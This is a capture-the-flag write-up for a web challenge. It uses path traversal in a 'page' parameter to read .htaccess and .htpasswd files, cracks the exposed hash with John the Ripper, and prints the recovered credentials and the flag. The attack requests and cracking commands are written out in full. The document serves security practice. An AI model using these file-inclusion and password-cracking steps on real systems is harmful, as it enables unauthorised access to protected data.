# secret area

## Description
Peter has made a secure area as part of his website at http://hack.bckdr.in/SECR/index.php?page=challenge.php. It is beleived that the flag is inside that area. See if you can get it.

Created by: Dhaval Kapil
No. of Correct Submissions: 380

## Solution
The content of the provided page contains the following line
```html
The flag for this challenge is in a password protected <a href = "secure/" target = "_blank">area</a>.
```

So we can see that there exist a "secure" directory.
If we try to access the linked site we are prompted with a standard .htaccess username and password protection.
The initial challenge link had an interresting url[http://hack.bckdr.in/SECR/index.php?page=challenge.php]. Maybe the page parameter may be vulnerable to path traversal?
I tried to look for the .htaccess and .htpasswd file (where username and hashed passwords for the .htaccess login is stored.)
```
http://hack.bckdr.in/SECR/index.php?page=.htaccess
Sorry the requested page cannot be shown/found.

http://hack.bckdr.in/SECR/index.php?page=.htpasswd
Sorry the requested page cannot be shown/found.
```
But they were not there.
We know from earlier that there exist a secure/ directory, so we can attempt to look for them inside here aswell.

```
http://hack.bckdr.in/SECR/index.php?page=secure/.htaccess
AuthType Basic AuthName "Secure area" AuthUserFile root/path/to/secure/.htpasswd require valid-user

http://hack.bckdr.in/SECR/index.php?page=secure/.htpasswd
vampire:dS/xVY4wI4PRU
```

Jackpot!

Lets see if we can crack the password with john the ripper.

```
$ touch .htpasswd && echo "vampire:dS/xVY4wI4PRU" > .htpasswd

$ john .htpasswd
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
No password hashes left to crack (see FAQ)

$ john --show .htpasswd
vampire:blood

1 password hash cracked, 0 left

```

Let's try to log in with our obtained credentials.

Flag: b7de8530d887ef26c7f1531851877a3bfefab92e91ecdd4154138825449cbbd1
